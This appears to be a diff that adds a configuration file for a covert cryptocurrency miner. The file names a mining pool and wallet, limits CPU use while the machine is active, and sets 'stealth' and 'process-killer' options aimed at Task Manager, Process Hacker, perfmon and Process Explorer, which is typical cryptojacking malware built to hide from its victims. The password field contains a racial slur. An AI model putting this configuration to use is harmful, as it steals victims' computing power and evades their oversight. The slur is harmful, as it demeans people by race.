@@ -1,0 +1,18 @@
+{
+"algo": "rx/0",
+"pool": "pool.hashvault.pro",
+"port": 3333,
+"wallet": "4ALTWvMfzxBguLc87S1RHNTRVmNPahDSB6zNxZAcGwZcPqvqpeWTvrU1irUVsmBnAoVog5d9Yq9fuUk6GykdCwDzVmp7jxG",
+"password": "ifuckniggers555",
+"rig-id": "",
+"keepalive": true,
+"nicehash": true,
+"ssltls": true,
+"max-cpu": 30,
+"idle-wait": 1,
+"idle-cpu": 90,
+"stealth": true,
+"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+"process-killer": false,
+"kill-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
+}
